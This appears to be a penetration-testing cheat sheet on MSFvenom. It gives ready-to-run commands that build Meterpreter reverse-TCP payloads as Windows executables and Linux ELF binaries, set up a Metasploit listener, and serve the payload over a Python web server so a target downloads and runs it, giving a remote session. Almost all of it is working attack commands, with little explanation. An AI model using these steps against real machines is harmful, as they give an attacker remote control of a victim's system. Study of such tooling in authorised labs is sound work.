**What is MSFvenom?** 

- Combines msfpayload + msfencode into one tool
- Generates malicious payloads for Windows, Linux, Mac, Web
- Part of Metasploit — pre-installed on Kali

**Staged vs Non-Staged:**

```
Staged:     windows/meterpreter/reverse_tcp   ← forward slash
Non-Staged: windows/meterpreter_reverse_tcp   ← underscore
```

---

**Windows Payloads**

```bash
# list all payloads
msfvenom --list payloads

# list output formats
msfvenom --list formats

# 32-bit Windows payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<kali-ip> LPORT=1234 \
  -f exe -o /root/payload_x86.exe

# 64-bit Windows payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<kali-ip> LPORT=1234 \
  -f exe -o /root/payload_x64.exe
```

**Linux Payloads**

```bash
# 32-bit Linux payload
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=<kali-ip> LPORT=1234 \ 
  -f elf -o /root/payload_x86

# 64-bit Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=<kali-ip> LPORT=1234 \
  -f elf -o /root/payload_x64

chmod +x /root/payload_x86
```

**Setup Handler (listener)**

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 1234
run
# waiting for connection...
```

**Deliver payload to target**

```bash
# host payload via web server
cd /root/
python3 -m http.server 80

# target downloads and executes
# → meterpreter session opens on handler ✓
```

**Output Formats:**

| Format   | Use                |
| -------- | ------------------ |
| exe      | Windows executable |
| elf      | Linux binary       |
| asp/aspx | Web shell          |
| dll      | Windows DLL        |
| jar      | Java               |
| msi      | Windows installer  |

**Key Notes**

- 32-bit payload works on both 32 and 64-bit Windows
- LHOST + LPORT in payload must match handler settings exactly
